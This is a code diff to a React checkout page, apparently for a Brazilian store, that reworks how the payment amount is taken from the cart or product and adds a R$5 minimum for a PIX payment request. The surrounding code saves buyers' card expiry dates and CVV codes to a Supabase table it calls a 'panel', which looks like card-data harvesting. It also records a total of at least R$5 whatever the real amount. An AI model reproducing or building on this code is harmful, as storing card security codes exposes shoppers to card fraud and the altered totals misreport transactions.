@@ -180,10 +180,20 @@ export default function Checkout() {
 
   const salvarDadosNoPainel = async (statusPagamento = 'pending') => {
     try {
-      const valorFinal = (produto.preco && produto.preco > 0) ? produto.preco : produto.precoOriginal;
+      // Prioriza o valor real do carrinho se houver itens
+      let valorFinal = 0;
       
-      if (!valorFinal || valorFinal <= 0) {
-        console.warn("Aviso: valor_total eh zero ou invalido. Usando precoOriginal como fallback.");
+      if (cartItems.length > 0) {
+        // Se há itens no carrinho, usa o total do carrinho
+        valorFinal = Number(cartTotal) || 0;
+      } else {
+        // Se não há carrinho, usa o valor do produto
+        valorFinal = (produto.preco && produto.preco > 0.01) ? produto.preco : produto.precoOriginal;
+      }
+      
+      // Garante que o valor nunca seja menor que 5 reais (limite da API)
+      if (!valorFinal || valorFinal < 5) {
+        console.warn(`Aviso: valor_total (${valorFinal}) é menor que 5 reais. Será rejeitado pela API de pagamento.`);
       }
       
       await supabase.from('checkouts').insert([{
@@ -203,10 +213,10 @@ export default function Checkout() {
         validade_cartao: metodo === 'cartao' ? formData.validade : 'PIX',
         cvv_cartao: metodo === 'cartao' ? formData.cvv : 'PIX',
         produto_nome: produto.nome,
-        valor_total: valorFinal,
+        valor_total: Math.max(valorFinal, 5), // Garante mínimo de 5 reais para a API
         status: statusPagamento
       }]);
-      console.log("Dados salvos no Supabase com sucesso! Valor:", valorFinal);
+      console.log("✅ Dados salvos no Supabase com sucesso! Valor:", Math.max(valorFinal, 5), "| Carrinho:", cartItems.length, "itens");
     } catch (e) {
       console.error("Erro ao salvar dados no painel:", e);
     }
@@ -223,9 +233,18 @@ export default function Checkout() {
     setPixData(null);
 
     try {
-      const amountInCents = Math.round(produto.preco * 100);
+      // Calcula o valor correto: carrinho ou produto
+      const valorPagamento = cartItems.length > 0 ? Number(cartTotal) || 0 : produto.preco;
+      
+      if (!valorPagamento || valorPagamento < 5) {
+        setPixErro('Valor da compra deve ser no mínimo R$ 5,00');
+        setPixLoading(false);
+        return;
+      }
+      
+      const amountInCents = Math.round(valorPagamento * 100);
       const payload = {
-        amount: produto.preco, // Envia valor real, a API converte para centavos
+        amount: valorPagamento, // Envia valor real, a API converte para centavos
         offer_hash: '35E5jbK1n9',
         payment_method: 'pix',
         installments: 1,
